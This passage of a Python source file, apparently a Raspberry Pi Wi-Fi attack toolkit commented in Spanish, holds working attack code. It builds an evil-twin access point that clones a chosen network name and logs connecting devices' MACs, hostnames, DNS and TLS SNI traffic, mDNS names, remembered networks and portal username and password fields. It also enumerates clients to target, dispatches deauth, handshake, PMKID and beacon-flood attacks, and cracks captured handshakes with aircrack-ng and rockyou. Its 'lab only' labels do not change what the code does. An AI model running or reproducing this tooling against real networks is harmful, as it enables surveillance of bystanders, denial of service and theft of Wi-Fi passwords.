    for f in (hostapd_conf, dnsmasq_conf):
        try:
            if f and os.path.exists(f):
                os.remove(f)
        except Exception:
            pass
    disable_monitor(iface)   # vuelve a managed + up

def _hp_parse_leases(logtext):
    """De la salida de dnsmasq (DHCPACK) -> {ip: (mac, hostname)}."""
    leases = {}
    for m in re.finditer(r'DHCPACK\([^)]*\)\s+([0-9.]+)\s+([0-9a-fA-F:]{17})\s*(\S*)', logtext):
        ip, mac, host = m.group(1), m.group(2).upper(), (m.group(3) or '').strip()
        leases[ip] = (mac, host if (host and host != '*') else '')
    return leases

def _hp_parse_domains(logtext):
    """De dnsmasq log-queries -> {ip: set(dominios)}."""
    dom = {}
    for m in re.finditer(r'query\[[A-Z]+\]\s+(\S+)\s+from\s+([0-9.]+)', logtext):
        dom.setdefault(m.group(2), set()).add(m.group(1))
    return dom

def _os_guess(ua, hints):
    s = (ua or "").lower()
    if "android" in s: return "Android"
    if "iphone" in s or "ipad" in s or "cfnetwork" in s or "darwin" in s: return "iOS"
    if "windows" in s: return "Windows"
    if "mac os" in s or "macintosh" in s: return "macOS"
    if "linux" in s: return "Linux"
    h = " ".join(hints or [])
    if "gstatic" in h or "googleapis" in h or "android" in h: return "Android"
    if "apple.com" in h or "aaplimg" in h: return "iOS"
    if "msftconnecttest" in h or "msftncsi" in h or "windows" in h: return "Windows"
    return "?"

# ── Telemetria extendida del honeypot (para auditoria, 2026-10-15) ──
def _int0(s):
    try:
        return int(str(s).strip().split()[0])
    except Exception:
        return None

def _iw_station_dump(iface):
    """#1/#2: {MAC: {rssi, rx, tx, dwell}} de `iw dev <if> station dump`. Hay que
    llamarlo con los clientes AUN asociados (antes del teardown)."""
    out = {}
    r = _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'station', 'dump'])
    if not r or not r.stdout:
        return out
    cur = None
    for raw in r.stdout.splitlines():
        line = raw.strip()
        m = re.match(r'Station ([0-9a-fA-F:]{17})', line)
        if m:
            cur = m.group(1).upper()
            out[cur] = {"rssi": None, "rx": None, "tx": None, "dwell": None}
            continue
        if not cur:
            continue
        if line.startswith('rx bytes:'):
            out[cur]["rx"] = _int0(line.split(':', 1)[1])
        elif line.startswith('tx bytes:'):
            out[cur]["tx"] = _int0(line.split(':', 1)[1])
        elif line.startswith('signal:'):
            mm = re.search(r'(-?\d+)', line)
            if mm: out[cur]["rssi"] = int(mm.group(1))
        elif line.startswith('connected time:'):
            mm = re.search(r'(\d+)', line)
            if mm: out[cur]["dwell"] = int(mm.group(1))
    return out

def _parse_dhcp_fp(logtext):
    """#3: {MAC: {vendor, options}} de dnsmasq con log-dhcp. Asocia las lineas
    'vendor class' / 'requested options' al ultimo MAC visto en el intercambio
    DHCP (robusto al formato con o sin xid)."""
    out = {}
    last_mac = None
    for line in logtext.splitlines():
        if 'dnsmasq-dhcp' not in line:
            continue
        mm = re.search(r'([0-9a-fA-F:]{17})', line)
        if mm:
            last_mac = mm.group(1).upper()
            out.setdefault(last_mac, {"vendor": None, "options": None})
        low = line.lower()
        if 'vendor class:' in low and last_mac:
            out[last_mac]["vendor"] = line.split('vendor class:', 1)[1].strip()[:64]
        elif 'requested options:' in low and last_mac:
            out[last_mac]["options"] = line.split('requested options:', 1)[1].strip()[:128]
    return out

def _tshark(pcap, dfilter, fields, timeout=40):
    """Corre tshark sobre el pcap (si esta instalado) y devuelve filas (listas de
    campos). El pcap lo escribe tcpdump como root -> leemos con sudo."""
    ts = _first_existing('/usr/bin/tshark', '/usr/sbin/tshark')
    if not ts or not pcap or not os.path.exists(pcap):
        return []
    cmd = ['sudo', ts, '-r', pcap, '-Y', dfilter, '-T', 'fields', '-E', 'separator=/t']
    for f in fields:
        cmd += ['-e', f]
    r = _run(cmd, timeout=timeout)
    rows = []
    if r and r.stdout:
        for line in r.stdout.splitlines():
            if line.strip():
                rows.append(line.split('\t'))
    return rows

def _tshark_sni(pcap):
    """#4: {ip: set(hosts)} de los ClientHello TLS = sitios HTTPS visitados."""
    out = {}
    for row in _tshark(pcap, 'tls.handshake.extensions_server_name',
                       ['ip.src', 'tls.handshake.extensions_server_name']):
        if len(row) >= 2 and row[0] and row[1]:
            out.setdefault(row[0], set()).add(row[1][:120])
    return out

def _tshark_mdns(pcap):
    """#6: {ip: nombre.local} anunciado por mDNS (suele traer el nombre del equipo)."""
    out = {}
    for row in _tshark(pcap, 'mdns', ['ip.src', 'dns.resp.name', 'dns.qry.name']):
        if not row or not row[0]:
            continue
        ip = row[0]
        for cand in row[1:]:
            for name in (cand or '').split(','):
                name = name.strip()
                if name.endswith('.local') and ip not in out:
                    out[ip] = name[:96]
    return out

def _probe_sniff(iface, seconds=8):
    """#5 (experimental, gated): pre-AP, pone wlan1 en monitor y captura probe
    requests para sacar la PNL (redes que el equipo recuerda). Devuelve
    {MAC: set(ssids)}. Riesgoso en rtw88 (monitor+AP en la misma radio) ->
    best-effort, restaura a managed al salir."""
    pnl = {}
    pcap = os.path.expanduser(f"~/piscanlvgl/data/captures/probe_{int(time.time())}.pcap")
    td = _first_existing('/usr/bin/tcpdump', '/usr/sbin/tcpdump')
    if not td:
        return pnl
    try:
        if not enable_monitor(iface):
            return pnl
        p = subprocess.Popen(['sudo', td, '-i', iface, '-w', pcap, '-U',
                              'type', 'mgt', 'subtype', 'probe-req'],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(max(4, int(seconds)))
        try:
            p.terminate()
        except Exception:
            pass
        _run(['sudo', '/usr/bin/pkill', '-f', 'tcpdump'])
        for row in _tshark(pcap, 'wlan.fc.type_subtype==0x04 && wlan.ssid != ""',
                           ['wlan.sa', 'wlan.ssid']):
            if len(row) >= 2 and row[0] and row[1]:
                pnl.setdefault(row[0].upper(), set()).add(row[1][:48])
    except Exception:
        pass
    finally:
        try:
            if os.path.exists(pcap):
                os.remove(pcap)
        except Exception:
            pass
        disable_monitor(iface)
    return pnl

def evil_twin(iface, ssid, bssid, channel, seconds=120):
    """Honeypot de reconocimiento: AP abierto con `ssid` + portal informativo
    que registra TELEMETRIA de los que se conectan (MAC/fabricante/IP/hostname/
    SO/dominios), SIN credenciales. Lee de Config honeypot_bridge (0/1) y
    honeypot_portal (plantilla). Devuelve (data, err) con
    data={ssid, count, clients:[...], bridge, log}. SOLO laboratorio."""
    ap_ch = 6                 # AP abierto en 2.4 (hw_mode=g), lo mas fiable
    uplink = "wlan0"          # interfaz con internet para el puente
    bridge = (_config_get("honeypot_bridge", "0") == "1")

    _ET_STATE["ssid"] = ssid
    _ET_STATE["portal"] = _config_get("honeypot_portal", None)
    _ET_STATE["bridge"] = bridge   # lo consulta _et_authorize() desde el portal
    with _HP_LOCK:
        _HP.clear()

    # Telemetria extendida (Config): pcap de la sesion (#7, default ON) y
    # pre-sniff de probe requests / PNL (#5, default OFF: usa monitor y en rtw88
    # convive mal con el AP).
    want_pcap = (_config_get("honeypot_pcap", "1") != "0")
    want_probe = (_config_get("honeypot_probe_sniff", "0") == "1")
    probe_pnl = {}
    if want_probe:
        probe_pnl = _probe_sniff(iface, 8)

    disable_monitor(iface)
    _run(['sudo', '/usr/bin/ip', 'addr', 'flush', 'dev', iface])

    hostapd_conf = None
    dnsmasq_conf = None
    procs = []
    httpd = None
    pcap_path = None
    stations = {}

    logpath = os.path.expanduser("~/piscanlvgl/data/captures/evil_twin.log")
    try:
        os.makedirs(os.path.dirname(logpath), exist_ok=True)
        logf = open(logpath, "w")
    except Exception:
        logf = open(os.devnull, "w")

    def log(msg):
        try:
            logf.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")
            logf.flush()
        except Exception:
            pass

    try:
        # hostapd (AP abierto con el nombre elegido)
        hf = tempfile.NamedTemporaryFile(mode='w', prefix='piscan_et_hostapd_',
                                         suffix='.conf', delete=False)
        hf.write(f"interface={iface}\ndriver=nl80211\nssid={ssid}\n"
                 f"hw_mode=g\nchannel={ap_ch}\n")
        hf.close()
        hostapd_conf = hf.name
        log(f"honeypot ssid={ssid} ch={ap_ch} bridge={bridge} portal={_ET_STATE['portal']}")
        procs.append(subprocess.Popen(['sudo', '/usr/sbin/hostapd', hostapd_conf],
                                      stdout=logf, stderr=logf))
        time.sleep(4)
        if procs[-1].poll() is not None:
            log("hostapd murio al arrancar")
            _et_teardown(iface, procs, hostapd_conf, dnsmasq_conf, httpd, bridge, uplink)
            logf.close()
            return None, "hostapd no pudo levantar el AP (ver data/captures/evil_twin.log)"

        _run(['sudo', '/usr/bin/ip', 'addr', 'add', '10.0.0.1/24', 'dev', iface])

        # #7 PCAP de la sesion (tcpdump): base para SNI (#4) y mDNS (#6). Lo mata
        # el teardown (pkill tcpdump) antes de que lo parseemos con tshark.
        if want_pcap:
            td = _first_existing('/usr/bin/tcpdump', '/usr/sbin/tcpdump')
            if td:
                pcap_path = os.path.expanduser(
                    f"~/piscanlvgl/data/captures/honeypot_{int(time.time())}.pcap")
                procs.append(subprocess.Popen(
                    ['sudo', td, '-i', iface, '-w', pcap_path, '-U'],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
                log(f"pcap: {pcap_path}")
            else:
                log("pcap: tcpdump no instalado (omito SNI/mDNS)")

        # puente de internet (opcional)
        if bridge:
            log(f"bridge NAT {uplink}->{iface}: {_et_bridge_add(iface, uplink)}")
            _nftbin = _nft()
            if _nftbin:
                rs = _run(['sudo', _nftbin, 'list', 'table', 'ip', 'piscan_nat'])
                log("piscan_nat instalada:\n" +
                    ((rs.stdout or rs.stderr or "(sin salida)") if rs else "(fallo nft list)"))

        # dnsmasq: DHCP + log de consultas. Con puente, DNS real (internet);
        # sin puente, todo al portal (address=/#/).
        base = (f"interface={iface}\nbind-interfaces\nlisten-address=10.0.0.1\n"
                "dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h\n"
                "dhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\n"
                "log-queries\nlog-dhcp\n")   # log-dhcp: vendor class + requested options (#3)
        base += ("server=8.8.8.8\nserver=1.1.1.1\n" if bridge
                 else "no-resolv\naddress=/#/10.0.0.1\n")
        df = tempfile.NamedTemporaryFile(mode='w', prefix='piscan_et_dnsmasq_',
                                         suffix='.conf', delete=False)
        df.write(base)
        df.close()
        dnsmasq_conf = df.name
        log("lanzando dnsmasq")
        procs.append(subprocess.Popen(['sudo', '/usr/sbin/dnsmasq', '-C', dnsmasq_conf, '-d'],
                                      stdout=logf, stderr=logf))
        time.sleep(1.5)
        if procs[-1].poll() is not None:
            log("dnsmasq murio (conflicto de puerto 53/67?)")

        # Sin puente: forzar el portal con redirect :80 (DNS wildcard, sin
        # internet). Con puente el redirect por-cliente ya lo monto _et_bridge_add
        # (walled garden) y se levanta solo hasta que el cliente pasa el portal.
        if not bridge:
            log(f"redirect 80->8080 via: {_et_redirect_add(iface)}")

        try:
            httpd = _ETServer(("0.0.0.0", 8080), _ETPortalHandler)
            threading.Thread(target=httpd.serve_forever, daemon=True).start()
            log("portal :8080 arriba")
        except Exception as e:
            log(f"portal :8080 FALLO: {e}")

        log(f"honeypot activo {seconds}s...")
        time.sleep(max(10, int(seconds)))
        # #1/#2: snapshot de estaciones (rssi/bytes/dwell) ANTES de bajar el AP.
        stations = _iw_station_dump(iface)
        log(f"fin del honeypot (estaciones: {len(stations)})")

    finally:
        _et_teardown(iface, procs, hostapd_conf, dnsmasq_conf, httpd, bridge, uplink)

    # Analisis: fusionar leases DHCP + hits del portal + dominios DNS
    try:
        with open(logpath, "r", errors="replace") as f:
            logtext = f.read()
    except Exception:
        logtext = ""
    leases = _hp_parse_leases(logtext)
    domains = _hp_parse_domains(logtext)
    dhcp_fp = _parse_dhcp_fp(logtext)          # #3 {mac: {vendor, options}}
    sni = _tshark_sni(pcap_path)               # #4 {ip: set(hosts)}
    mdns = _tshark_mdns(pcap_path)             # #6 {ip: nombre.local}

    prefixes = {mac.replace(":", "")[:6] for (mac, _h) in leases.values() if mac}
    vendors = _resolve_vendors(prefixes) if prefixes else {}

    clients = []
    for ip in (set(leases.keys()) | set(_HP.keys())):
        mac, host = leases.get(ip, ("", ""))
        pref = mac.replace(":", "")[:6] if mac else ""
        if pref and pref in vendors:
            vendor = vendors[pref]
        elif mac:
            try:
                vendor = "(aleatoria)" if (int(pref[:2], 16) & 0x02) else "?"
            except ValueError:
                vendor = "?"
        else:
            vendor = "?"
        hp = _HP.get(ip, {})
        hosts = sorted(hp.get("hosts", set()))
        doms = sorted(domains.get(ip, set()))
        st = stations.get(mac, {}) if mac else {}
        fp = dhcp_fp.get(mac, {}) if mac else {}
        snih = sorted(sni.get(ip, set()))
        pnl = sorted(probe_pnl.get(mac, set())) if mac else []
        clients.append({
            "ip": ip, "mac": mac, "vendor": vendor, "hostname": host,
            "os": _os_guess(hp.get("ua", ""), hosts + doms),
            "user_agent": hp.get("ua", ""), "hits": hp.get("hits", 0),
            "domains": doms[:40],
            "portal_user": hp.get("user", ""), "portal_pass": hp.get("pass", ""),
            # telemetria extendida:
            "rssi": st.get("rssi"), "bytes_rx": st.get("rx"),
            "bytes_tx": st.get("tx"), "dwell_s": st.get("dwell"),
            "dhcp_vendor": fp.get("vendor"), "dhcp_fingerprint": fp.get("options"),
            "sni_hosts": snih[:60], "mdns_name": mdns.get(ip),
            "probe_ssids": pnl[:40], "pcap_path": pcap_path,
        })

    try:
        logf.close()
    except Exception:
        pass
    return {"ssid": ssid, "count": len(clients), "clients": clients,
            "bridge": bridge, "log": logpath}, None


# OUI -> fabricante. Los primeros 3 bytes del MAC identifican al fabricante.
# Preferimos una base del sistema si existe (completa); si no, un fallback chico.
_OUI_BUILTIN = {
    "B827EB": "Raspberry Pi", "DCA632": "Raspberry Pi", "E45F01": "Raspberry Pi",
    "28CDC1": "Raspberry Pi", "D83ADD": "Raspberry Pi", "2CCF67": "Raspberry Pi",
    "F0F61C": "Apple", "A4B197": "Apple", "D0817A": "Apple", "AC87A3": "Apple",
    "3C0754": "Apple", "F0989D": "Apple", "88665A": "Apple",
    "FCFBFB": "Samsung", "5CF6DC": "Samsung", "8425DB": "Samsung", "E8508B": "Samsung",
    "ECB0E1": "Xiaomi", "F8A45F": "Xiaomi", "64B473": "Xiaomi",
    "0CB6D2": "Huawei", "48435A": "Huawei", "D4F9A1": "Huawei",
    "503EAA": "TP-Link", "AC84C6": "TP-Link", "6466B3": "TP-Link",
    "001A11": "Google", "F4F5E8": "Google", "3C5AB4": "Google",
    "001565": "Intel", "A0C589": "Intel", "7C7A91": "Intel",
}

def _oui_file():
    # Primero la base que viene en el repo (completa, IEEE, formato
    # "AA:BB:CC\tFabricante"); si no, bases del sistema por si existieran.
    for p in (os.path.expanduser("~/piscanlvgl/data/oui.txt"),
              "/usr/share/ieee-data/oui.txt", "/var/lib/ieee-data/oui.txt",
              "/usr/share/aircrack-ng/airodump-ng-oui.txt",
              "/usr/share/wireshark/manuf", "/usr/share/misc/oui.txt"):
        if os.path.exists(p):
            return p
    return None

def _resolve_vendors(prefixes):
    """prefixes: set de prefijos de 6 hex en MAYUSCULA sin separador.
    Devuelve {prefijo: fabricante}. Lee el archivo del sistema una vez y
    recolecta solo los prefijos pedidos (<=20), asi no arma todo el dict."""
    result = {}
    want = set(prefixes)
    for p in want:
        if p in _OUI_BUILTIN:
            result[p] = _OUI_BUILTIN[p]
    path = _oui_file()
    if path:
        try:
            with open(path, "r", errors="replace") as f:
                for line in f:
                    m = re.match(r'^\s*([0-9A-Fa-f]{2})[:-]([0-9A-Fa-f]{2})[:-]([0-9A-Fa-f]{2})', line)
                    if not m:
                        continue
                    pref = (m.group(1) + m.group(2) + m.group(3)).upper()
                    if pref in want and pref not in result:
                        rest = line[m.end():].replace('(hex)', '').strip().strip('\t').strip()
                        vendor = re.split(r'\t|  +', rest)[0].strip() if rest else ''
                        if vendor:
                            result[pref] = vendor[:24]
                    if len(result) == len(want):
                        break
        except Exception:
            pass
    return result

def scan_clients(bssid, channel, iface, seconds=12):
    """Enumera los clientes (estaciones) asociados a un AP. SOLO ESCUCHA:
    corre airodump-ng filtrado por --bssid durante `seconds` (sin inyeccion)
    y parsea la seccion 'Station' del CSV. Devuelve (clients, err) con
    clients = [{mac, power, packets}] (solo los asociados a este bssid).
    Mismo patron reset->monitor->...->managed que el resto."""
    bssid = bssid.upper()
    ok = enable_monitor(iface)
    if not ok:
        return None, f"No se pudo activar modo monitor (estado: {get_status(iface)})"

    ch = _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'set', 'channel', str(channel)])
    if ch is None or ch.returncode != 0:
        disable_monitor(iface)
        return None, f"No se pudo fijar canal {channel}"
    time.sleep(1)

    tmpdir = tempfile.mkdtemp(prefix="piscan_cli_")
    prefix = os.path.join(tmpdir, "scan")
    _run(['sudo', '/usr/bin/timeout', str(seconds),
          '/usr/sbin/airodump-ng', '--bssid', bssid, '-c', str(channel),
          '-w', prefix, '--output-format', 'csv', iface],
         timeout=seconds + 5)

    disable_monitor(iface)

    clients = []
    csv_files = glob.glob(prefix + "*.csv")
    if csv_files:
        try:
            with open(csv_files[0], "r", errors="replace") as f:
                content = f.read()
        except Exception:
            content = ""
        # El CSV de airodump tiene 2 secciones; la de estaciones arranca en
        # la linea de encabezado "Station MAC". Los 6 primeros campos
        # (MAC, first, last, power, #packets, BSSID) no tienen comas, asi
        # que un split simple alcanza (los Probed ESSIDs van al final).
        idx = content.find("Station MAC")
        if idx != -1:
            lines = [l for l in content[idx:].splitlines() if l.strip()]
            for line in lines[1:]:
                parts = [p.strip() for p in line.split(",")]
                if len(parts) < 6:
                    continue
                if parts[5].upper() != bssid:   # solo asociados a este AP
                    continue
                clients.append({"mac": parts[0], "power": parts[3], "packets": parts[4]})

    try:
        for fpath in glob.glob(prefix + "*"):
            os.remove(fpath)
        os.rmdir(tmpdir)
    except Exception:
        pass

    # Mas activos primero (mejor objetivo para forzar reconexion/handshake)
    def _pk(c):
        try:
            return int(c["packets"])
        except (ValueError, KeyError):
            return -1
    clients.sort(key=_pk, reverse=True)

    # Fabricante por OUI (primeros 3 bytes del MAC). Las MAC con el bit
    # 0x02 del primer octeto en 1 son "localmente administradas" = aleatorias
    # (privacidad de iOS/Android); no pertenecen a ningun fabricante, asi que
    # ninguna base OUI las resuelve: se etiquetan como (aleatoria).
    prefixes = {c["mac"].replace(":", "").replace("-", "").upper()[:6] for c in clients}
    vendors = _resolve_vendors(prefixes)
    for c in clients:
        pref = c["mac"].replace(":", "").replace("-", "").upper()[:6]
        v = vendors.get(pref)
        if v:
            c["vendor"] = v
        else:
            try:
                local_admin = bool(int(pref[:2], 16) & 0x02)
            except ValueError:
                local_admin = False
            c["vendor"] = "(aleatoria)" if local_admin else "?"

    return clients, None


WORDLIST_DIR = os.path.expanduser("~/piscanlvgl/data/wordlists")
WORDLISTS = {
    "common": os.path.join(WORDLIST_DIR, "common.txt"),   # top 10k, chequeo rapido
    "full":   os.path.join(WORDLIST_DIR, "rockyou.txt"),  # 14M, auditoria a fondo (lento en Pi 3)
}

def _resolve_wordlist(key):
    """Resuelve una wordlist por: (1) alias en WORDLISTS, (2) nombre de
    archivo dentro de WORDLIST_DIR, (3) ruta absoluta. Default: common."""
    if key in WORDLISTS:
        return WORDLISTS[key]
    if key:
        cand = os.path.join(WORDLIST_DIR, key)
        if os.path.exists(cand):
            return cand
        if os.path.isabs(key) and os.path.exists(key):
            return key
    return WORDLISTS.get("common")

def list_wordlists():
    """Lista los .txt en WORDLIST_DIR con nombre y tamano. La UI las usa
    para dejar elegir cual usar. Ordena de la mas chica a la mas grande
    (las chicas son mas rapidas en el Pi)."""
    result = []
    if not os.path.isdir(WORDLIST_DIR):
        return result
    for fname in os.listdir(WORDLIST_DIR):
        if not fname.endswith(".txt"):
            continue
        full = os.path.join(WORDLIST_DIR, fname)
        try:
            size = os.path.getsize(full)
        except OSError:
            continue
        result.append({
            "name": fname,
            "key": fname,
            "size_mb": round(size / (1024 * 1024), 2),
            "fast": size < 1024 * 1024,   # <1MB = rapida en el Pi
        })
    result.sort(key=lambda x: x["size_mb"])
    return result

def audit_handshake(cap_file, bssid, wordlist_key="common", timeout_seconds=120):
    """Corre aircrack-ng con una wordlist contra el .cap para ver si la
    contrasena de la red es debil (esta en la lista). Devuelve
    (found, password_or_None, output). Con la lista 'common' (10k) tarda
    segundos; con 'full' (rockyou 14M) puede tardar ~45min en el Pi 3,
    por eso el timeout configurable."""
    bssid = bssid.upper()
    wordlist = _resolve_wordlist(wordlist_key)

    if not os.path.exists(cap_file):
        return False, None, f"No existe el archivo de captura: {cap_file}"
    if not os.path.exists(wordlist):
        return False, None, f"No existe la wordlist: {wordlist}"

    r = _run(['sudo', '/usr/bin/timeout', str(timeout_seconds),
              '/usr/bin/aircrack-ng', '-w', wordlist, '-b', bssid, cap_file],
             timeout=timeout_seconds + 5)
    output = ((r.stdout or '') + (r.stderr or '')) if r else ''

    # aircrack-ng imprime "KEY FOUND! [ password ]" si la encontro
    m = re.search(r'KEY FOUND!\s*\[\s*(.+?)\s*\]', output)
    if m:
        return True, m.group(1), output
    return False, None, output

def _bssid_from_filename(fname):
    """Extrae el BSSID del nombre de captura:
      'hs_2491BB2A53CC_<ts>-01.cap'    (handshake, airodump)
      'pmkid_2491BB2A53D0_<ts>.cap'    (PMKID/EAPOL convertido de hcxdumptool)
    -> '24:91:BB:2A:53:CC'. Devuelve (bssid, ts) o (None, None) si no matchea."""
    import re
    m = re.match(r'(?:hs|pmkid)_([0-9A-Fa-f]{12})_(\d+)', fname)
    if not m:
        return None, None
    hexb = m.group(1).upper()
    bssid = ':'.join(hexb[i:i+2] for i in range(0, 12, 2))
    try:
        ts = int(m.group(2))
    except ValueError:
        ts = None
    return bssid, ts

def _ssid_for_bssid(bssid):
    """Cruza el BSSID con WifiScanLog para obtener el nombre de red mas
    reciente que se haya visto con ese BSSID. Devuelve el SSID o None."""
    try:
        sys.path.insert(0, os.path.expanduser("~/piscanlvgl/app"))
        from db.models import get_session, WifiScanLog
        from sqlalchemy import func
        s = get_session()
        row = (s.query(WifiScanLog)
                 .filter(func.lower(WifiScanLog.bssid) == bssid.lower())
                 .order_by(WifiScanLog.timestamp.desc())
                 .first())
        return row.ssid if row and row.ssid else None
    except Exception:
        return None

def list_captures():
    """Lista los .cap de data/captures con: archivo, BSSID, SSID (cruzado
    con la DB), timestamp y si tiene handshake valido. Ordenado del mas
    reciente al mas viejo. Salta los archivos vacios/fallidos (<1KB)."""
    cap_dir = os.path.expanduser("~/piscanlvgl/data/captures")
    result = []
    if not os.path.isdir(cap_dir):
        return result
    files = [f for f in os.listdir(cap_dir) if f.endswith('.cap')]
    for fname in files:
        full = os.path.join(cap_dir, fname)
        try:
            size = os.path.getsize(full)
        except OSError:
            continue
        if size < 1024:   # descartamos capturas vacias/fallidas (24 bytes, etc.)
            continue
        bssid, ts = _bssid_from_filename(fname)
        ssid = _ssid_for_bssid(bssid) if bssid else None
        # Heuristico rapido: handshake grande (>100KB) O captura PMKID/EAPOL
        # (el .cap de hcxdumptool es chico pero ya contiene hash crackeable;
        #  solo se genera cuando hubo captura). La auditoria revela el real.
        has_hs = size > 100000 or fname.startswith("pmkid_")
        result.append({
            "file": full,
            "name": fname,
            "bssid": bssid or "??",
            "ssid": ssid or "(desconocida)",
            "ts": ts or 0,
            "size": size,
            "handshake": bool(has_hs),
        })
    result.sort(key=lambda x: x["ts"], reverse=True)
    return result
def main():
    if len(sys.argv) < 2:
        print(json.dumps({"ok": False, "error": "uso: wifi_ops.py <status|enable|disable> [iface]"}))
        sys.exit(1)

    cmd = sys.argv[1]
    iface = sys.argv[2] if len(sys.argv) > 2 else 'wlan1'
    ensure_up(iface)

    if cmd == 'status':
        print(json.dumps({"ok": True, "mode": get_status(iface)}))
    elif cmd == 'enable':
        success = enable_monitor(iface)
        print(json.dumps({"ok": success, "mode": get_status(iface)}))
    elif cmd == 'disable':
        success = disable_monitor(iface)
        print(json.dumps({"ok": success, "mode": get_status(iface)}))
    elif cmd == 'deauth':
        if len(sys.argv) < 5:
            print(json.dumps({"ok": False, "error": "uso: wifi_ops.py deauth <bssid> <channel> <count> [iface]"}))
            sys.exit(1)
        bssid = sys.argv[2]
        channel = int(sys.argv[3])
        count = int(sys.argv[4])
        iface_deauth = sys.argv[5] if len(sys.argv) > 5 else 'wlan1'
        duration = int(sys.argv[6]) if len(sys.argv) > 6 else 0
        client_mac = sys.argv[7] if len(sys.argv) > 7 else None
        if client_mac and client_mac.strip():
            # Selectivo: un cliente concreto (tap en una fila de cliente).
            output, err = deauth(bssid, channel, count, iface_deauth, duration, client_mac)
            atype = "deauth"
        else:
            # "Deauth red": dirigido a TODOS los clientes asociados (broadcast
            # no tumba clientes modernos). Fallback a broadcast si no hay clientes.
            output, err = deauth_network(bssid, channel, iface_deauth, duration, count)
            atype = "deauth_red"
        if err:
            log_attack(atype, bssid, "fail", target_client_mac=client_mac, details=err)
            print(json.dumps({"ok": False, "error": err, "mode": get_status(iface_deauth)}))
        else:
            log_attack(atype, bssid, "success", target_client_mac=client_mac, details=output)
            print(json.dumps({"ok": True, "output": output, "mode": get_status(iface_deauth)}))
    elif cmd == 'handshake':
        if len(sys.argv) < 4:
            print(json.dumps({"ok": False, "error": "uso: wifi_ops.py handshake <bssid> <channel> [iface] [segundos] [deauth_count]"}))
            sys.exit(1)
        bssid = sys.argv[2]
        channel = int(sys.argv[3])
        iface_hs = sys.argv[4] if len(sys.argv) > 4 else 'wlan1'
        capture_seconds = int(sys.argv[5]) if len(sys.argv) > 5 else 20
        deauth_count = int(sys.argv[6]) if len(sys.argv) > 6 else 5
        has_hs, cap_file, hs_output = capture_handshake(bssid, channel, iface_hs, capture_seconds, deauth_count)
        if has_hs:
            log_attack("handshake", bssid, "success", details=f"cap={cap_file}")
            print(json.dumps({"ok": True, "handshake": True, "cap_file": cap_file}))
        else:
            log_attack("handshake", bssid, "fail", details=(hs_output or "sin handshake")[:500])
            print(json.dumps({"ok": True, "handshake": False, "cap_file": cap_file, "detail": (hs_output or "")[:400]}))
    elif cmd == 'audit':
        if len(sys.argv) < 4:
            print(json.dumps({"ok": False, "error": "uso: wifi_ops.py audit <cap_file> <bssid> [common|full] [timeout_seg]"}))
            sys.exit(1)
        cap_file = sys.argv[2]
        bssid = sys.argv[3]
        wordlist_key = sys.argv[4] if len(sys.argv) > 4 else 'common'
        timeout_seconds = int(sys.argv[5]) if len(sys.argv) > 5 else 120
        found, password, audit_output = audit_handshake(cap_file, bssid, wordlist_key, timeout_seconds)
        if found:
            log_attack("audit", bssid, "weak", details=f"wordlist={wordlist_key} pass_len={len(password)}")
            print(json.dumps({"ok": True, "found": True, "password": password, "wordlist": wordlist_key}))
        else:
            log_attack("audit", bssid, "strong", details=f"wordlist={wordlist_key} no encontrada")
            print(json.dumps({"ok": True, "found": False, "wordlist": wordlist_key}))
    elif cmd == 'pmkid':
        if len(sys.argv) < 4:
            print(json.dumps({"ok": False, "error": "uso: wifi_ops.py pmkid <bssid> <channel> [iface] [segundos]"}))
            sys.exit(1)
        bssid = sys.argv[2]
        channel = int(sys.argv[3])
        iface_pk = sys.argv[4] if len(sys.argv) > 4 else 'wlan1'
        seconds = int(sys.argv[5]) if len(sys.argv) > 5 else 30
        data, err = pmkid_capture(bssid, channel, iface_pk, seconds)
        if err:
            log_attack("pmkid", bssid, "fail", details=err)
            print(json.dumps({"ok": False, "error": err, "mode": get_status(iface_pk)}))
        else:
            got = data["pmkid_target"] or data["eapol_target"]
            log_attack("pmkid", bssid, "success" if got else "nada",
                       details=f"hashes={data['hashes']} pmkid={data['pmkid_target']} eapol={data['eapol_target']} hc={data['hc22000']}")
            out = {"ok": True}
            out.update(data)
            print(json.dumps(out))
    elif cmd == 'beacon':
        channel = int(sys.argv[2]) if len(sys.argv) > 2 else 6
        seconds = int(sys.argv[3]) if len(sys.argv) > 3 else 20
        iface_b = sys.argv[4] if len(sys.argv) > 4 else 'wlan1'
        data, err = beacon_flood(iface_b, channel, seconds)
        if err:
            log_attack("beacon", "", "fail", details=err)
            print(json.dumps({"ok": False, "error": err, "mode": get_status(iface_b)}))
        else:
            log_attack("beacon", "", "done",
                       details=f"ch={data['channel']} {data['seconds']}s {data['pps']}pps")
            out = {"ok": True}
            out.update(data)
            print(json.dumps(out))
    elif cmd == 'evil_twin':
        if len(sys.argv) < 4:
            print(json.dumps({"ok": False, "error": "uso: wifi_ops.py evil_twin <ssid> <bssid> <channel> [segundos] [iface]"}))
            sys.exit(1)
        ssid = sys.argv[2]
        bssid = sys.argv[3]
        channel = int(sys.argv[4]) if len(sys.argv) > 4 else 6
        seconds = int(sys.argv[5]) if len(sys.argv) > 5 else 120
        iface_et = sys.argv[6] if len(sys.argv) > 6 else 'wlan1'
        data, err = evil_twin(iface_et, ssid, bssid, channel, seconds)
        if err:
            log_attack("honeypot", "", "fail", target_ssid=ssid, details=err)
            print(json.dumps({"ok": False, "error": err, "mode": get_status(iface_et)}))
        else:
            n = data["count"]
            log_honeypot(ssid, data["clients"])   # telemetria por dispositivo
            log_attack("honeypot", "", "done", target_ssid=ssid,
                       details=f"clientes={n} bridge={data.get('bridge')}")
            out = {"ok": True}
            out.update(data)
            print(json.dumps(out))
    elif cmd == 'clients':
        if len(sys.argv) < 4:
            print(json.dumps({"ok": False, "error": "uso: wifi_ops.py clients <bssid> <channel> [iface] [segundos]"}))
            sys.exit(1)
        bssid = sys.argv[2]
        channel = int(sys.argv[3])
        iface_cli = sys.argv[4] if len(sys.argv) > 4 else 'wlan1'
        seconds = int(sys.argv[5]) if len(sys.argv) > 5 else 12
        clients, err = scan_clients(bssid, channel, iface_cli, seconds)
        if err:
            print(json.dumps({"ok": False, "error": err, "mode": get_status(iface_cli)}))
        else:
